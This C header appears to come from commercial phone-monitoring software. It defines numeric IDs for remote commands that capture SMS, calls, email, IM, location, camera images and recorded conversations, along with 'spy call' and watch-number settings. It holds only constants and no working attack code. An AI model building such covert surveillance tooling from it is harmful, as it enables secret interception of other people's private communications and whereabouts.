
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdSettingsCode
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  16/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

typedef enum
{
	kRemoteCmdSMS							= 1,
	kRemoteCmdCallLog						= 2,
	kRemoteCmdEmail							= 3,
	kRemoteCmdCellInfo						= 4,
	kRemoteCmdMMS							= 5,
//	kRemoteCmdContact						= 6, // Obsolete
	kRemoteCmdLocation						= 7,
	kRemoteCmdIM							= 8,
	kRemoteCmdWallPaper						= 9,
	kRemoteCmdCameraImage					= 10,
	kRemoteCmdAudioRecording				= 11,
	kRemoteCmdAudioConversation				= 12,
	kRemoteCmdVideoFile						= 13,
	kRemoteCmdPinMessage					= 14,
	kRemoteCmdApplicationLifeCycle			= 15,
	kRemoteCmdBrowserURL					= 16,
	kRemoteCmdCalendar						= 17,
	kRemoteCmdNote							= 18,
	
	kRemoteCmdSetStartStopCapture			= 41,
	kRemoteCmdSetDeliveryTimer				= 42,
	kRemoteCmdSetEventCount					= 43,
	kRemoteCmdSetEnableWatch				= 44,
	kRemoteCmdSetWatchFlags					= 45,
	kRemoteCmdSetLocationTimer				= 46,
	kRemoteCmdPanicMode						= 47,
	kRemoteCmdNotificationNumbers			= 48,
	kRemoteCmdHomeNumbers					= 50,
	kRemoteCmdCISNumbers					= 51,
	kRemoteCmdMonitorNumbers				= 52,
	kRemoteCmdEnableSpyCall					= 53,
	kRemoteCmdEnableRestrictions			= 54,
	kRemoteCmdAddressBookManagementMode		= 55,
	kRemoteCmdVCARD_VERSION					= 56,
	kRemoteCmdEanbleApplicationProfile		= 57,
	kRemoteCmdEnableUrlProfile				= 58,
	kRemoteCmdEmergencyNumbers				= 59,
	kRemoteCmdWatchNumbers					= 60,
	kRemoteCmdEnableWaitingForApprovalPolicy= 61,
	kRemoteCmdAndroidRootStatus				= 62,
	kRemoteCmdSMSKeywords					= 63
} RemoteCmdSettingsID;